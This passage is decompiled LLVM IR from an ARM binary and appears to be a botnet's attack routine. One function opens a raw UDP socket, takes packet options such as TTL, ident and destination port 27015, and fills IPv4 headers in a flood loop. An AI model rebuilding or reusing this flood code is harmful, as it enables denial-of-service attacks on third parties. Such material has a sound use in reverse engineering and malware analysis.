  %v0_bb64 = phi i32 [ %v0_bb64.pre, %dec_label_pc_bb60.preheader ], [ 0, %dec_label_pc_bc60 ], [ 0, %dec_label_pc_bb60 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bb64 = icmp eq i32 %v0_bb64, 0
  store i1 %v2_bb64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bb64, label %dec_label_pc_bb60, label %dec_label_pc_bb70

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bb60, %dec_label_pc_bc60
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb74

dec_label_pc_bb74:                                ; preds = %dec_label_pc_bbdc, %dec_label_pc_bb70
  %v1_bb88 = phi i32 [ %v1_bc50, %dec_label_pc_bbdc ], [ 0, %dec_label_pc_bb70 ]
  %v5_bb78 = mul i32 %v1_bb88, 24
  %v1_bb7c = load i32, i32* @r8, align 4
  %v2_bb7c = add i32 %v1_bb7c, %v5_bb78
  store i32 %v2_bb7c, i32* %r3.global-to-local, align 4
  store i32 %v2_b884, i32* %r1.global-to-local, align 4
  %v1_bb84 = add i32 %v2_bb7c, 20
  %v2_bb84 = inttoptr i32 %v1_bb84 to i8*
  %v3_bb84 = load i8, i8* %v2_bb84, align 1
  %v4_bb84 = zext i8 %v3_bb84 to i32
  store i32 %v4_bb84, i32* %r2.global-to-local, align 4
  %v4_bb88 = mul i32 %v1_bb88, 4
  %v5_bb88 = add i32 %v4_bb88, %v2_b884
  %v6_bb88 = inttoptr i32 %v5_bb88 to i32*
  %v7_bb88 = load i32, i32* %v6_bb88, align 4
  store i32 %v7_bb88, i32* @r5, align 4
  %v7_bb8c = icmp eq i8 %v3_bb84, 31
  store i1 %v7_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v1_bb90 = add i32 %v7_bb88, 20
  store i32 %v1_bb90, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bb84, 32
  br i1 %tmp62, label %dec_label_pc_bc74, label %dec_label_pc_bb98

dec_label_pc_bb98:                                ; preds = %dec_label_pc_bb74
  store i32 %v6_b98c, i32* %r3.global-to-local, align 4
  store i1 %v8_bccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bba4

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bc74, %dec_label_pc_bb98
  store i32 %v3_ba1c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bce4, label %dec_label_pc_bcf0, label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge, %dec_label_pc_bba4
  %v1_bbbc = phi i32 [ %v1_bbbc.pre, %dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge ], [ 65535, %dec_label_pc_bba4 ]
  store i32 %v3_b9fc, i32* %r0.global-to-local, align 4
  %v9_bbbc = icmp eq i32 %v3_b9fc, %v1_bbbc
  store i1 %v9_bbbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbbc, label %dec_label_pc_bd04, label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bbb8
  %v1_bbc8 = phi i32 [ %v1_bcfc, %dec_label_pc_bcf0 ], [ %v1_bbbc, %dec_label_pc_bbb8 ]
  store i32 %v3_ba14, i32* %r1.global-to-local, align 4
  %v9_bbc8 = icmp eq i32 %v3_ba14, %v1_bbc8
  store i1 %v9_bbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbc8, label %dec_label_pc_bd18, label %dec_label_pc_bbd0

dec_label_pc_bbd0:                                ; preds = %dec_label_pc_bd04, %dec_label_pc_bbc4
  store i32 %v1_b978, i32* %r3.global-to-local, align 4
  store i1 %v2_bd20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd20, label %dec_label_pc_bbdc, label %dec_label_pc_bd2c

dec_label_pc_bbdc:                                ; preds = %dec_label_pc_bbd0, %dec_label_pc_bd18, %dec_label_pc_bd2c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bbe0 = load i32, i32* @r5, align 4
  %v3_bbe0 = add i32 %v2_bbe0, 10
  %v4_bbe0 = inttoptr i32 %v3_bbe0 to i16*
  store i16 0, i16* %v4_bbe0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r5, align 4
  store i32 %v0_bbe8, i32* @r0, align 4
  %v2_bbec = call i32 @function_c848(i32 %v0_bbe8, i32 20)
  %v3_bbec = trunc i32 %v2_bbec to i16
  %v3_bbf0 = load i32, i32* @r5, align 4
  %v4_bbf0 = add i32 %v3_bbf0, 10
  %v5_bbf0 = inttoptr i32 %v4_bbf0 to i16*
  store i16 %v3_bbec, i16* %v5_bbf0, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bbf8 = load i32, i32* @r6, align 4
  %v3_bbf8 = add i32 %v2_bbf8, 6
  %v4_bbf8 = inttoptr i32 %v3_bbf8 to i16*
  store i16 0, i16* %v4_bbf8, align 2
  %v0_bbfc = load i32, i32* @r6, align 4
  store i32 %v0_bbfc, i32* @r1, align 4
  %v1_bc00 = add i32 %v0_bbfc, 4
  %v2_bc00 = inttoptr i32 %v1_bc00 to i16*
  %v3_bc00 = load i16, i16* %v2_bc00, align 2
  %v4_bc00 = zext i16 %v3_bc00 to i32
  store i32 %v4_bc00, i32* %r2.global-to-local, align 4
  %v0_bc04 = load i32, i32* @sl, align 4
  store i32 %v0_bc04, i32* %r3.global-to-local, align 4
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r0.global-to-local, align 4
  %v4_bc0c = call i32 @function_c898(i32 %v0_bc08, i32 %v0_bbfc, i32 %v4_bc00, i32 %v0_bc04)
  %v5_bc0c = trunc i32 %v4_bc0c to i16
  store i32 %v4_bc0c, i32* %r0.global-to-local, align 4
  %v3_bc10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc10, i32* %r3.global-to-local, align 4
  %v3_bc14 = mul i32 %v3_bc10, 32
  store i32 %v3_bc14, i32* %lr.global-to-local, align 4
  %v3_bc18 = load i32, i32* @r6, align 4
  %v4_bc18 = add i32 %v3_bc18, 6
  %v5_bc18 = inttoptr i32 %v4_bc18 to i16*
  store i16 %v5_bc0c, i16* %v5_bc18, align 2
  %v0_bc1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc1c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc1c, -8
  %v5_bc1c = add i32 %v0_bc1c, %tmp63
  store i32 %v5_bc1c, i32* %lr.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r6, align 4
  %v1_bc20 = add i32 %v0_bc20, 2
  %v2_bc20 = inttoptr i32 %v1_bc20 to i16*
  %v3_bc20 = load i16, i16* %v2_bc20, align 2
  %v1_bc24 = load i32, i32* @r8, align 4
  %v2_bc24 = add i32 %v1_bc24, %v5_bc1c
  store i32 %v2_bc24, i32* @lr, align 4
  %v3_bc28 = add i32 %v2_bc24, 2
  %v4_bc28 = inttoptr i32 %v3_bc28 to i16*
  store i16 %v3_bc20, i16* %v4_bc28, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc34 = load i32, i32* @r5, align 4
  store i32 %v0_bc34, i32* %r1.global-to-local, align 4
  %v0_bc38 = load i32, i32* @fp, align 4
  store i32 %v0_bc38, i32* %r0.global-to-local, align 4
  %v0_bc3c = load i32, i32* @sb, align 4
  store i32 %v0_bc3c, i32* %r2.global-to-local, align 4
  %v0_bc40 = load i32, i32* @lr, align 4
  %v6_bc48 = call i32 @function_11560(i32 %v0_bc38, i32 %v0_bc34, i32 %v0_bc3c, i32 16384, i32 %v0_bc40, i32 16)
  %v3_bc4c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc4c, i32* %r3.global-to-local, align 4
  %v1_bc50 = add i32 %v3_bc4c, 1
  store i32 %v1_bc50, i32* %r0.global-to-local, align 4
  %v1_bc54 = load i32, i32* @r7, align 4
  %v9_bc54 = icmp eq i32 %v1_bc50, %v1_bc54
  store i1 %v9_bc54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc50, i32* %stack_var_-44, align 4
  %v5_bc5c = icmp slt i32 %v1_bc50, %v1_bc54
  br i1 %v5_bc5c, label %dec_label_pc_bb74, label %dec_label_pc_bc60

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bbdc
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bc64 = icmp eq i32 %v1_bc54, 0
  store i1 %v2_bc64, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bc64, label %dec_label_pc_bb60, label %dec_label_pc_bb70

dec_label_pc_bc74:                                ; preds = %dec_label_pc_bb74
  %v1_bc74 = add i32 %v2_bb7c, 16
  %v2_bc74 = inttoptr i32 %v1_bc74 to i32*
  %v3_bc74 = load i32, i32* %v2_bc74, align 4
  %v0_bc78 = call i32 @function_e0b4()
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v3_bc7c = load i32, i32* %stack_var_-44, align 4
  %v5_bc84 = mul i32 %v3_bc7c, 24
  %v1_bc88 = and i32 %v3_bc74, 16711680
  store i32 %v1_bc88, i32* %ip.global-to-local, align 4
  %v3_bc8c = udiv i32 %v3_bc74, 16777216
  %v4_bc90 = udiv i32 %v1_bc88, 256
  %v5_bc90 = or i32 %v4_bc90, %v3_bc8c
  store i32 %v5_bc90, i32* %r2.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r8, align 4
  %v2_bc94 = add i32 %v1_bc94, %v5_bc84
  store i32 %v2_bc94, i32* %r1.global-to-local, align 4
  %v1_bc98 = and i32 %v3_bc74, 65280
  store i32 %v1_bc98, i32* %r3.global-to-local, align 4
  %v1_bc9c = add i32 %v2_bc94, 20
  %v2_bc9c = inttoptr i32 %v1_bc9c to i8*
  %v3_bc9c = load i8, i8* %v2_bc9c, align 1
  %v4_bc9c = zext i8 %v3_bc9c to i32
  store i32 %v4_bc9c, i32* %ip.global-to-local, align 4
  %v5_bca4 = call i32 @llvm.bswap.i32(i32 %v3_bc74)
  %v7_bca8 = lshr i32 %v0_bc78, %v4_bc9c
  %v8_bca8 = add i32 %v7_bca8, %v5_bca4
  store i32 %v8_bca8, i32* %r2.global-to-local, align 4
  %v1_bcac = and i32 %v8_bca8, 16711680
  store i32 %v1_bcac, i32* %r0.global-to-local, align 4
  %v1_bcb8 = and i32 %v8_bca8, 65280
  store i32 %v1_bcb8, i32* %r1.global-to-local, align 4
  %v5_bcc0 = call i32 @llvm.bswap.i32(i32 %v8_bca8)
  %v1_bcc4 = load i32, i32* @r5, align 4
  %v2_bcc4 = add i32 %v1_bcc4, 16
  %v3_bcc4 = inttoptr i32 %v2_bcc4 to i32*
  store i32 %v5_bcc0, i32* %v3_bcc4, align 4
  store i32 %v6_b98c, i32* %r3.global-to-local, align 4
  store i1 %v8_bccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bba4

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bc74, %dec_label_pc_bb98
  %v0_bcd4 = call i32 @function_e0b4()
  store i32 %v0_bcd4, i32* %r0.global-to-local, align 4
  store i32 %v3_ba1c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_bce4, i1* %cpsr_z.global-to-local, align 1
  %v1_bce8 = load i32, i32* @r5, align 4
  %v2_bce8 = add i32 %v1_bce8, 12
  %v3_bce8 = inttoptr i32 %v2_bce8 to i32*
  store i32 %v0_bcd4, i32* %v3_bce8, align 4
  br i1 %v3_bce4, label %dec_label_pc_bcf0, label %dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge

dec_label_pc_bcd4.dec_label_pc_bbb8_crit_edge:    ; preds = %dec_label_pc_bcd4
  %v1_bbbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbb8

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bba4
  %v0_bcf0 = call i32 @function_e0b4()
  %v1_bcf0 = trunc i32 %v0_bcf0 to i16
  %v3_bcf4 = load i32, i32* @r5, align 4
  %v4_bcf4 = add i32 %v3_bcf4, 4
  %v5_bcf4 = inttoptr i32 %v4_bcf4 to i16*
  store i16 %v1_bcf0, i16* %v5_bcf4, align 2
  store i32 %v3_b9fc, i32* %r0.global-to-local, align 4
  %v1_bcfc = load i32, i32* @r4, align 4
  %v9_bcfc = icmp eq i32 %v3_b9fc, %v1_bcfc
  store i1 %v9_bcfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bcfc, label %dec_label_pc_bd04, label %dec_label_pc_bbc4

dec_label_pc_bd04:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bbb8
  %v0_bd04 = call i32 @function_e0b4()
  %v1_bd04 = trunc i32 %v0_bd04 to i16
  store i32 %v0_bd04, i32* %r0.global-to-local, align 4
  store i32 %v3_ba14, i32* %r1.global-to-local, align 4
  %v1_bd0c = load i32, i32* @r4, align 4
  %v9_bd0c = icmp eq i32 %v3_ba14, %v1_bd0c
  store i1 %v9_bd0c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd10 = load i32, i32* @r5, align 4
  %v4_bd10 = add i32 %v3_bd10, 20
  %v5_bd10 = inttoptr i32 %v4_bd10 to i16*
  store i16 %v1_bd04, i16* %v5_bd10, align 2
  br i1 %v9_bd0c, label %dec_label_pc_bd18, label %dec_label_pc_bbd0

dec_label_pc_bd18:                                ; preds = %dec_label_pc_bd04, %dec_label_pc_bbc4
  %v0_bd18 = call i32 @function_e0b4()
  %v1_bd18 = trunc i32 %v0_bd18 to i16
  store i32 %v0_bd18, i32* %r0.global-to-local, align 4
  store i32 %v1_b978, i32* %r3.global-to-local, align 4
  store i1 %v2_bd20, i1* %cpsr_z.global-to-local, align 1
  %v3_bd24 = load i32, i32* @r6, align 4
  %v4_bd24 = add i32 %v3_bd24, 2
  %v5_bd24 = inttoptr i32 %v4_bd24 to i16*
  store i16 %v1_bd18, i16* %v5_bd24, align 2
  br i1 %v2_bd20, label %dec_label_pc_bbdc, label %dec_label_pc_bd2c

dec_label_pc_bd2c:                                ; preds = %dec_label_pc_bbd0, %dec_label_pc_bd18
  %v0_bd2c = load i32, i32* @r5, align 4
  %v1_bd2c = add i32 %v0_bd2c, 28
  store i32 %v1_bd2c, i32* %r0.global-to-local, align 4
  store i32 %v0_ba44, i32* %r1.global-to-local, align 4
  %v2_bd34 = inttoptr i32 %v1_bd2c to i16*
  %v3_bd34 = call i32 @function_e248(i16* %v2_bd34, i32 %v0_ba44)
  store i32 %v3_bd34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbdc

dec_label_pc_bd3c:                                ; preds = %dec_label_pc_b9b0
  %v0_bd3c = load i32, i32* @fp, align 4
  store i32 %v0_bd3c, i32* %r0.global-to-local, align 4
  %v1_bd40 = call i32 @function_10dd8(i32 %v0_bd3c)
  store i32 %v1_bd40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_b868, %dec_label_pc_bd3c
  %v1_bd4c = phi i32 [ %v3_b9a0, %dec_label_pc_b868 ], [ %v1_bd40, %dec_label_pc_bd3c ]
  store i32 %v18_b868, i32* %sb.global-to-local, align 4
  store i32 %v27_b868, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd4c

; uselistorder directives
  uselistorder i32 %v0_bd18, { 1, 0 }
  uselistorder i32 %v0_bd04, { 1, 0 }
  uselistorder i32 %v1_bcfc, { 1, 0 }
  uselistorder i32 %v3_bc74, { 2, 1, 3, 0 }
  uselistorder i32 %v1_bc50, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc1c, { 1, 0 }
  uselistorder i32 %v4_bc0c, { 1, 0 }
  uselistorder i1 %v2_bd20, { 2, 3, 1, 0 }
  uselistorder i1 %v3_bce4, { 3, 2, 0, 1 }
  uselistorder i32 %v3_ba90, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_ba78, { 1, 0 }
  uselistorder i32 %v1_ba48, { 1, 0, 2 }
  uselistorder i32 %v1_ba44, { 1, 0, 2 }
  uselistorder i32 %v3_ba1c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_ba04, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b9fc, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_b9f4, { 1, 0, 2 }
  uselistorder i32 %v0_ba44, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_b9e4, { 3, 1, 2, 0 }
  uselistorder i1 %v7_b9d0, { 1, 0 }
  uselistorder i1 %v7_b9a4, { 1, 0 }
  uselistorder i32 %v3_b9a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b98c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b978, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b904, { 1, 2, 0 }
  uselistorder i32 %v1_b8e0, { 2, 1, 0 }
  uselistorder i32 %v6_b8d8, { 1, 0 }
  uselistorder i32 %v7_b8c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b89c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b884, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 1, 3, 2, 4, 6, 5, 7, 8, 10, 9, 12, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 15, 14, 17, 16, 19, 20, 18, 22, 21, 24, 23, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 43, 44, 45, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %ip.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 2, 3, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 1, 2 }
  uselistorder i32 (i16*, i32)* @function_e248, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bd2c, { 1, 0 }
  uselistorder label %dec_label_pc_bbdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bb70, { 1, 0 }
  uselistorder label %dec_label_pc_bb60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bb60.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_bd54(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bd54:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_bd54 = load i32, i32* @r4, align 4
  %v27_bd54 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_bd70 = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_bd74 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_bd70, i32* @fp, align 4
  %v0_bd84 = load i32, i32* @r4, align 4
  %v5_bd88 = inttoptr i32 %v0_bd74 to i32*
  %v6_bd88 = call i32 @function_8570(i32 %v0_bd84, i32* %v5_bd88, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_bd94 = urem i32 %v6_bd88, 256
  store i32 %v1_bd94, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bda0 = load i32, i32* @r4, align 4
  %v0_bda4 = load i32, i32* @r5, align 4
  %v5_bda8 = trunc i32 %v6_bd88 to i8
  %v6_bdac = inttoptr i32 %v0_bda4 to i32*
  %v7_bdac = call i32 @function_8570(i32 %v0_bda0, i32* %v6_bdac, i32 3, i32 65535, i32 %v6_bd88)
  %v0_bdb0 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bdac, i32* @r7, align 4
  %v0_bdc0 = load i32, i32* @r4, align 4
  %v5_bdc4 = inttoptr i32 %v0_bdb0 to i32*
  %v6_bdc4 = call i32 @function_8570(i32 %v0_bdc0, i32* %v5_bdc4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_bdcc = urem i32 %v6_bdc4, 256
  store i32 %v1_bdcc, i32* %ip.global-to-local, align 4
  %v0_bdd0 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bddc = load i32, i32* @r4, align 4
  %sext = mul i32 %v6_bdc4, 16777216
  %v5_bde4 = sdiv i32 %sext, 16777216
  %v6_bde4 = inttoptr i32 %v0_bdd0 to i32*
  %v7_bde4 = call i32 @function_8570(i32 %v0_bddc, i32* %v6_bde4, i32 5, i32 0, i32 %v5_bde4)
  %v1_bdf0 = urem i32 %v7_bde4, 256
  store i32 %v1_bdf0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bdfc = load i32, i32* @r4, align 4
  %v0_be00 = load i32, i32* @r5, align 4
  %v5_be08 = inttoptr i32 %v0_be00 to i32*
  %v6_be08 = call i32 @function_8570(i32 %v0_bdfc, i32* %v5_be08, i32 6, i32 65535, i32 %v1_bdf0)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_be18 = load i32, i32* @r5, align 4
  store i32 %v6_be08, i32* @r6, align 4
  %v0_be20 = load i32, i32* @r4, align 4
  %v5_be24 = inttoptr i32 %v0_be18 to i32*
  %v6_be24 = call i32 @function_8570(i32 %v0_be20, i32* %v5_be24, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_be24, i32* @r4, align 4
  %v1_be30 = call i32 @function_fd60(i32 23)
  %v3_be3c = call i32 @function_fc9c(i32 23, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_be50 = call i32 @function_115e4(i32 2, i32 3, i32 17)
  %v7_be54 = icmp eq i32 %v3_be50, -1
  store i1 %v7_be54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_be50, i32* @sb, align 4
  br i1 %v7_be54, label %dec_label_pc_c17c, label %dec_label_pc_be60

dec_label_pc_be60:                                ; preds = %dec_label_pc_bd54
  store i32 1, i32* %stack_var_-44, align 4
  %v6_be68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_be68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_be7c = call i32 @function_115a0(i32 %v3_be50, i32 0, i32 3, i32 %v6_be68, i32 ptrtoint (i32* @0 to i32))
  %v7_be80 = icmp eq i32 %v5_be7c, -1
  store i1 %v7_be80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_be80, label %dec_label_pc_c174, label %dec_label_pc_be88

dec_label_pc_be88:                                ; preds = %dec_label_pc_be60
  %v0_be88 = load i32, i32* @r4, align 4
  %v3_be88 = mul i32 %v0_be88, 65536
  store i32 %v3_be88, i32* @lr, align 4
  %v0_be8c = load i32, i32* @r7, align 4
  %v0_be90 = load i32, i32* @r6, align 4
  %v3_be90 = mul i32 %v0_be90, 65536
  store i32 %v3_be90, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_be98 = urem i32 %v0_be8c, 65536
  %v3_be9c = urem i32 %v0_be90, 65536
  store i32 %v3_be9c, i32* %r2.global-to-local, align 4
  %v3_bea0 = urem i32 %v0_be88, 65536
  store i32 %v3_bea0, i32* %r3.global-to-local, align 4
  %v0_bea4 = load i32, i32* @r8, align 4
  %v2_bea4 = icmp eq i32 %v0_bea4, 0
  store i1 %v2_bea4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bea4, label %dec_label_pc_bfe0.preheader, label %dec_label_pc_bebc

dec_label_pc_bebc:                                ; preds = %dec_label_pc_be88
  %tmp33 = mul i32 %v0_be8c, 256
  %v3_becc = and i32 %tmp33, 65280
  store i32 %v3_becc, i32* %r3.global-to-local, align 4
  %tmp34 = mul i32 %v0_be90, 256
  %v3_bed0 = and i32 %tmp34, 65280
  store i32 %v3_bed0, i32* %r2.global-to-local, align 4
  %tmp35 = mul i32 %v0_be88, 256
  %v3_bed4 = and i32 %tmp35, 65280
  %tmp36 = udiv i32 %v0_be8c, 256
  %v4_bed8 = urem i32 %tmp36, 256
  %v5_bed8 = or i32 %v4_bed8, %v3_becc
  store i32 %v5_bed8, i32* @r5, align 4
  %tmp37 = udiv i32 %v0_be90, 256
  %v4_bedc = urem i32 %tmp37, 256
  %v5_bedc = or i32 %v4_bedc, %v3_bed0
  store i32 %v5_bedc, i32* @r6, align 4
  %tmp38 = udiv i32 %v0_be88, 256
  %v4_bee0 = urem i32 %tmp38, 256
  %v5_bee0 = or i32 %v4_bee0, %v3_bed4
  store i32 %v5_bee0, i32* @r7, align 4
  %v1_bf68 = trunc i32 %v5_bde4 to i8
  br label %dec_label_pc_bee4

dec_label_pc_bee4:                                ; preds = %.thread, %dec_label_pc_bebc
  %v2_beec = call i32 @function_1214c(i32 128, i32 1)
  %v3_bef0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bef0, i32* %r2.global-to-local, align 4
  %v5_bef8 = mul i32 %v3_bef0, 24
  store i32 %v5_bef8, i32* %r3.global-to-local, align 4
  %v1_befc = load i32, i32* @fp, align 4
  %v2_befc = load i32, i32* @r4, align 4
  %v5_befc = mul i32 %v2_befc, 4
  %v6_befc = add i32 %v5_befc, %v1_befc
  %v7_befc = inttoptr i32 %v6_befc to i32*
  store i32 %v2_beec, i32* %v7_befc, align 4
  %v0_bf00 = load i32, i32* %r3.global-to-local, align 4
  %v1_bf00 = load i32, i32* @sl, align 4
  %v2_bf00 = add i32 %v1_bf00, %v0_bf00
  store i32 %v2_bf00, i32* %r3.global-to-local, align 4
  %v0_bf04 = load i32, i32* @fp, align 4
  %v1_bf04 = load i32, i32* %r2.global-to-local, align 4
  %v4_bf04 = mul i32 %v1_bf04, 4
  %v5_bf04 = add i32 %v4_bf04, %v0_bf04
  %v6_bf04 = inttoptr i32 %v5_bf04 to i32*
  %v7_bf04 = load i32, i32* %v6_bf04, align 4
  store i32 %v7_bf04, i32* @lr, align 4
  %v1_bf0c = inttoptr i32 %v7_bf04 to i8*
  %v2_bf0c = load i8, i8* %v1_bf0c, align 1
  %tmp = urem i8 %v2_bf0c, 16
  %v1_bf10 = zext i8 %tmp to i32
  %v1_bf14 = or i32 %v1_bf10, 64
  store i32 %v1_bf14, i32* %r3.global-to-local, align 4
  %v1_bf1c = trunc i32 %v1_bf14 to i8
  store i8 %v1_bf1c, i8* %v1_bf0c, align 1
  %v0_bf20 = load i32, i32* @lr, align 4
  %v1_bf20 = inttoptr i32 %v0_bf20 to i8*
  %v2_bf20 = load i8, i8* %v1_bf20, align 1
  %v1_bf24 = and i8 %v2_bf20, -16
  %v1_bf28 = or i8 %v1_bf24, 5
  store i8 %v1_bf28, i8* %v1_bf20, align 1
  %v2_bf34 = load i32, i32* @lr, align 4
  %v3_bf34 = add i32 %v2_bf34, 1
  %v4_bf34 = inttoptr i32 %v3_bf34 to i8*
  store i8 %v5_bda8, i8* %v4_bf34, align 1
  %v3_bf38 = load i32, i32* %stack_var_-48, align 4
  %v3_bf3c = mul i32 %v3_bf38, 65536
  %v1_bf40 = add i32 %v3_bf3c, 2097152
  %v3_bf44 = udiv i32 %v1_bf40, 256
  %v4_bf4c = udiv i32 %v1_bf40, 16777216
  %v5_bf4c = or i32 %v3_bf44, %v4_bf4c
